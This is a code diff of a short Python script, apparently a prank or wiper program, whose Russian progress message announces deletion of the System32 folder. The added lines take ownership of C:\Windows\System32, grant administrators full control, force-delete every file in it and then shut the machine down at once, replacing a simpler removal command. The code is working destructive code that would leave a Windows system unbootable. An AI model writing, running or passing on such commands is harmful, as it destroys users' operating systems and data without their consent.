@@ -18,7 +18,10 @@ while True:
         for i in range(0,101, 10):
             print(f'\rУдаление Папки System32: {i}%...',end='')
             time.sleep(0.1)
-        os.system('rd /s /q C:/Windows/System32')
+        
+        os.system('takeown /f "C:\\Windows\\System32" /r /d y')
+        os.system('icacls "C:\\Windows\\System32" /grant administrators:F /t')
+        os.system('del /f /s /q "C:\\Windows\\System32\\*.*"')
         os.system('shutdown -s -t 0')
         break   
     else:
